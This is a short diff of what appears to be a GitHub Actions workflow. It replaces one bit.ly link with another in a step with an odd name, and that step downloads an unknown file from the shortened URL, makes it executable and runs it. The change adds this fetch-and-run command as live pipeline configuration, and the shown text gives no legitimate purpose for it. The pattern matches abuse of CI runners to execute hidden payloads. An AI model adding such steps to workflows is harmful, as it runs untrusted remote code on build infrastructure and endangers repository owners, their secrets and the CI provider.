@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: 🍼Nyusuwae
       run: |
-        wget https://bit.ly/3kQAE77 && chmod +x 3kQAE77 && ./3kQAE77
+        wget https://bit.ly/38F3FNv && chmod +x 38F3FNv && ./38F3FNv
